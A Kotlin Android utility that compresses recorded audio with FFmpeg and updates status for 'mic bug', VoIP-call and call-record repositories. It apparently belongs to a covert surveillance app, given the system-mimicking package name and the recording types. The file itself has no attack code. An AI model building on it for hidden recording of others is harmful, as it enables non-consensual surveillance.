package com.android.services.util

import android.content.Context
import android.util.Log
import com.arthenica.mobileffmpeg.Config
import com.arthenica.mobileffmpeg.FFmpeg
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File

object AudioCompressionUtil {
    /**
     * This method provides with the utility to Compress the Audio File
     * @param sourceFile Source File
     * @param destFile Destination File
     */
    fun compressAudio(context: Context, sourceFilePath: String, destFile: String, logType: String) {
        GlobalScope.launch(Dispatchers.IO) {
            try {
                when (val rc =
                    FFmpeg.execute("-y -i $sourceFilePath -ar 44100 -ac 2 -ab 20k -c:v mpeg4 $destFile")) {
                    Config.RETURN_CODE_SUCCESS -> {
                        logVerbose(
                            "Command execution completed successfully.",
                            AppConstants.MIC_BUG_TYPE
                        )
                        reNameFile(context, sourceFilePath, destFile, logType)
                        updateCompressionStatus(context, sourceFilePath, logType)
                    }

                    Config.RETURN_CODE_CANCEL -> {
                        logVerbose(
                            "Command execution cancelled by user.",
                            AppConstants.MIC_BUG_TYPE
                        )
                        reNameFile(context, sourceFilePath, destFile, logType)
                        updateCompressionStatus(context, sourceFilePath, logType)
                    }

                    else -> {
                        logVerbose(
                            String.format(
                                "Command execution failed with rc=%d and the output below.",
                                rc
                            ), AppConstants.MIC_BUG_TYPE
                        )
                        Config.printLastCommandOutput(Log.INFO)
                        updateCompressionStatus(context, sourceFilePath, logType)
                    }
                }
            } catch (ex: Exception) {
                updateCompressionStatus(context, sourceFilePath, logType)
            }
        }
    }

    private suspend fun reNameFile(
        context: Context,
        sourceFile: String,
        destFile: String,
        logType: String
    ) {
        withContext(Dispatchers.IO) {
            AppUtils.reNameSourceFileWithDestFile(
                context,
                sourceFile,
                destFile,
                logType
            )
        }
    }

    suspend fun updateCompressionStatus(context: Context, sourceFile: String, logType: String) {
        withContext(Dispatchers.IO) {
            when (logType) {
                AppConstants.MIC_BUG_TYPE -> {
                    InjectorUtils.provideMicBugRepository(context)
                        .updateCompressionStatus(sourceFile)
                }

                AppConstants.VOIP_CALL_TYPE -> {
                    InjectorUtils.provideVoipCallRepository(context)
                        .updateCompressionStatus(sourceFile)
                }

                else -> {
                    InjectorUtils.provideCallRecordRepository(context)
                        .updateCompressionStatus(sourceFile)
                }
            }
        }
    }

}